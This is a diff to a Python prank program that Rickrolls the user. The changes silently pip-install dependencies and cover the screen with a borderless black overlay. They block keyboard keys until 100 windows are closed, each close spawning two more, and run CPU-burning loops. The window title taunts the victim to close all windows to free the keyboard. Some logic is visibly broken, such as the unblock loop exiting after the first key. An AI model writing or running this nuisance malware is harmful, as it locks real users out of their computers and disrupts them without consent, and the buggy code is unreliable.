@@ -1,13 +1,24 @@
-from tkinter import Tk, Label, PhotoImage
-from random import randint
-from requests import get
-from PIL import Image as im
-import io, sys, time
-from playsound import playsound
-from multiprocessing import Process
-import webbrowser
-from pathlib import Path
-from keyboard import block_key
+while True:
+    try:
+        from tkinter import Tk, Label, PhotoImage, Toplevel
+        from random import randint
+        from requests import get
+        from PIL import Image as im
+        import io, sys, time, os
+        from playsound import playsound
+        from multiprocessing import Process
+        import webbrowser
+        from pathlib import Path
+        from keyboard import block_key, unblock_key
+
+        break
+
+    except ImportError:
+        dep = ["pillow", "playsound", "requests", "keyboard"]
+        for i in dep:
+            os.system(f"cmd /c pip install {i}")
+
+windows_to_close = 50
 
 image_urls =["https://bot.to/wp-content/uploads/2020/09/antirickroll_5f6fcaafddcd9.png",
              "https://styles.redditmedia.com/t5_3d3rqx/styles/communityIcon_j93l74ux7kx51.png?width=256&s=fa2767dae0ab75ef06c6a1a5ca8e4b7b23711c90",
@@ -25,24 +36,21 @@ for i in range(len(image_urls)):
 f = 0
 
 def music():
-    webbrowser.open('https://github.com/Nuspli/rickrol/blob/main/rick.mp3?raw=true', autoraise=False)
-    time.sleep(3)
+    if Path(Path.home() / "Downloads/rick.mp3").is_file() == False:
+        webbrowser.open('https://github.com/Nuspli/rickrol/blob/main/rick.mp3?raw=true', autoraise=False)
+        time.sleep(5)
     while True:
-        playsound(f'{str(Path.home() / "Downloads/rick.mp3")}')
+        playsound(Path.home() / "Downloads/rick.mp3")
+        if p1.is_alive() == False:
+            sys.exit()
 
 
 def on_closing(r):
     r.destroy()
-    if f == 1:
+    if f == 2*windows_to_close:
         for m in range(150):
-            block_key(m)
-        
-        root = Tk()
-        root.title("")
-        root.configure(background='black')
-        root.attributes('-fullscreen', True)
-        root.attributes('-topmost', True)
-        root.protocol("WM_DELETE_WINDOW", lambda arg=root: on_closing(arg))
+            unblock_key(m)
+            sys.exit()
     newWin()
     newWin()
 
@@ -67,20 +75,31 @@ rocket = 0
 
 def func1():
     global rocket
+
+    roooot = Tk()
+    roooot.title("")
+    roooot.configure(background='black')
+    roooot.geometry(f'{roooot.winfo_screenwidth()}x{roooot.winfo_screenheight()}+0+0')
+    roooot.overrideredirect(True)
+
     root = Tk()
 
-    root.title("oh no, you've got Kolmus")
+    root.title("close all windows to free your keyboard xD")
     root.geometry(f'256x256+{randint(0, root.winfo_screenwidth() - 256)}+{randint(0, root.winfo_screenheight() - 256)}')
     root.resizable(False, False)
-    photo = PhotoImage(file=img_names[1])
-    Label(image=photo).pack()
+    photo = PhotoImage(master=root, file=img_names[1])
+    Label(root, image=photo).pack()
 
     root.attributes('-toolwindow', True)
     root.attributes('-topmost', True)
     root.protocol("WM_DELETE_WINDOW", lambda arg=root: on_closing(arg))
-    global f
-    f += 1
+
+    for m in range(150):
+        block_key(m)
     root.mainloop()
+
+    roooot.after(100, root.mainloop())
+    roooot.mainloop()
 
     while rocket < sys.maxsize:
         rocket += 1
@@ -92,8 +111,10 @@ def func2():
         rocket += 1
 
 if __name__=='__main__':
-    p1 = Process(target=func1)
-    p1.start()
     p2 = Process(target=func2)
     p2.start()
+    p1 = Process(target=func1)
+    p1.start()
+
+
 
